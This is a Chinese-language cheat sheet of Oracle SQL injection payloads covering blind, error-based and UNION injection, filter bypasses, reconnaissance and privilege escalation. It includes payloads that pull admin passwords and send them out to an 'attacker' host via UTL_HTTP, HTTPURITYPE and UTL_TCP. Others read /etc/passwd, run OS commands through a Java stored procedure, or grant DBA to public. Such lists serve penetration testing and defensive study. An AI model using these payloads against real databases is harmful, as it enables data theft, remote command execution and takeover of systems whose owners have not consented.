# Oracle SQL 注入 Payload 模板

## 基础注入检测

### 布尔盲注

```sql
' AND 1=1--
' AND 1=2--
" AND 1=1--
" AND 1=2--
') AND 1=1--
') AND 1=2--
```

### 时间盲注

```sql
' AND (SELECT COUNT(*) FROM ALL_USERS WHERE ROWNUM<=1 AND DBMS_LOCK.SLEEP(5)=1)>0--
' AND DBMS_LOCK.SLEEP(5)=1--
' UNION SELECT DBMS_LOCK.SLEEP(5) FROM DUAL--
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM DUAL)=1--
```

### 报错注入

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--
```

## 数据提取

### UNION 注入

```sql
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT 1,2,3 FROM DUAL--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,NULL,NULL FROM user_tables--
' UNION SELECT column_name,NULL,NULL FROM user_tab_columns WHERE table_name='USERS'--
```

### 布尔盲注提取

```sql
# 逐字符提取
' AND (SELECT SUBSTR(banner,1,1) FROM v$version WHERE rownum=1)='O'--
' AND ASCII(SUBSTR((SELECT password FROM users WHERE username='ADMIN'),1,1))>65--

# 使用 DECODE
' AND 1=DECODE((SELECT SUBSTR(banner,1,1) FROM v$version WHERE rownum=1),'O',1,0)--
```

## Oracle 特有功能

### 读取文件 (需要权限)

```sql
# UTL_FILE
' UNION SELECT UTL_FILE.FOPEN('/etc','passwd','r') FROM DUAL--

# 创建目录并读取
'; CREATE DIRECTORY test AS '/etc'; SELECT * FROM USER_DIRECTORIES--
```

### 执行命令 (需要 Java 权限)

```sql
# 创建 Java 类
'; CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS import java.lang.*; import java.io.*; public class cmd { public static String exec(String cmd) throws Exception { Runtime rt = Runtime.getRuntime(); Process p = rt.exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; StringBuilder out = new StringBuilder(); while ((line = br.readLine()) != null) { out.append(line); } return out.toString(); } };--

# 创建包装函数
'; CREATE OR REPLACE FUNCTION exec_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME 'cmd.exec(java.lang.String) return String';--

# 执行
'; SELECT exec_cmd('id') FROM DUAL--
```

### HTTP 请求

```sql
# UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST('http://attacker/?data='||(SELECT password FROM users WHERE username='ADMIN')) FROM DUAL--

# HTTPURITYPE
' UNION SELECT HTTPURITYPE('http://attacker/?d='||(SELECT password FROM users WHERE rownum=1)).getCLOB() FROM DUAL--
```

### 网络连接

```sql
# UTL_TCP
'; DECLARE c UTL_TCP.connection; BEGIN c := UTL_TCP.open_connection('attacker', 4444); UTL_TCP.write_line(c, (SELECT password FROM users WHERE username='ADMIN')); UTL_TCP.close_connection(c); END;--
```

## 绕过技术

### 引号绕过

```sql
# 使用 CHR
' UNION SELECT CHR(116)||CHR(101)||CHR(115)||CHR(116) FROM DUAL--

# 使用 TRANSLATE
' UNION SELECT TRANSLATE('abcd','abcd','test') FROM DUAL--
```

### 空白替代

```sql
# 使用注释
'/**/AND/**/1=1--

# 使用 tab/换行
'%09AND%091=1--
```

### 函数替代

```sql
# SUBSTR -> SUBSTRING
' AND SUBSTRING((SELECT banner FROM v$version WHERE rownum=1),1,1)='O'--

# || 连接
' UNION SELECT username||':'||password FROM users--
```

## 信息收集

```sql
# 版本信息
' UNION SELECT banner FROM v$version--

# 当前用户
' UNION SELECT user FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL--

# 数据库信息
' UNION SELECT name FROM v$database--
' UNION SELECT instance_name FROM v$instance--

# 表结构
' UNION SELECT table_name FROM user_tables--
' UNION SELECT column_name FROM user_tab_columns WHERE table_name='USERS'--

# 权限检查
' UNION SELECT * FROM session_privs--
' UNION SELECT granted_role FROM user_role_privs--
```

## 提权技术

### 检查权限

```sql
' UNION SELECT * FROM session_privs WHERE privilege LIKE '%ANY%'--
' UNION SELECT granted_role FROM user_role_privs WHERE granted_role LIKE '%DBA%'--
```

### Grant 权限

```sql
'; GRANT DBA TO public--
'; GRANT SELECT ANY TABLE TO public--
```